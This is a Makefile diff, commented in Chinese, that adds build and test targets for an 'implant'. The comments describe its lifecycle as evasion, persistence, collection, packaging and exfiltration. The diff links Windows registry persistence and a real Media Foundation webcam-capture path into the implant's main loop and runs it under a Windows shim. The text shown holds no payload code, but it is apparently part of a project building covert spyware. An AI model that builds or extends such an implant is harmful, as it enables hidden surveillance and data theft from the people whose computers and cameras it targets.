@@ -107,7 +107,22 @@ winshim-build:
 	$(SHIM_CXX) -c tests/test_persist_win.cpp -o $(SHIM_BUILD)/test_persist_win.o
 	$(CXX) $(SHIM_BUILD)/persist_win.o $(SHIM_BUILD)/shim_impl.o \
 	      $(SHIM_BUILD)/test_persist_win.o -o $(SHIM_BUILD)/test_persist_win
+	# 单体植入体接线层：对抗 -> 驻留 -> 采集 -> 打包 -> 回传 的完整生命周期。
+	# implant_main.c / implant.c / cam_mock.c 是纯 C99，用 -x c++ 与 shim 一起编译，
+	# 使 Windows 专属的 persist_win.o（shim 注册表）能被真实链接进来。
+	$(SHIM_CXX) -x c++ -c src/implant_main.c -o $(SHIM_BUILD)/implant_main.o
+	$(SHIM_CXX) -x c++ -c src/implant.c -o $(SHIM_BUILD)/implant.o
+	$(SHIM_CXX) -x c++ -c src/cam_jpeg.c -o $(SHIM_BUILD)/cam_jpeg.o
+	$(SHIM_CXX) -c tests/test_implant_main.cpp -o $(SHIM_BUILD)/test_implant_main.o
+	# 采集后端用 cam_mf.o（Windows 真实代码路径 + shim 假设备），而不是
+	# cam_mock.o：shim_impl 已提供 camera 层实现，两者同链会重复定义。
+	# 这样验证的是 Windows 采集路径本身能被主循环驱动。
+	$(CXX) $(SHIM_BUILD)/implant_main.o $(SHIM_BUILD)/implant.o \
+	      $(SHIM_BUILD)/cam_mf.o $(SHIM_BUILD)/cam_jpeg.o \
+	      $(SHIM_BUILD)/persist_win.o $(SHIM_BUILD)/shim_impl.o \
+	      $(SHIM_BUILD)/test_implant_main.o -o $(SHIM_BUILD)/test_implant_main
 
 winshim: winshim-build
 	@./$(SHIM_BUILD)/test_mf_logic
 	@./$(SHIM_BUILD)/test_persist_win
+	@./$(SHIM_BUILD)/test_implant_main
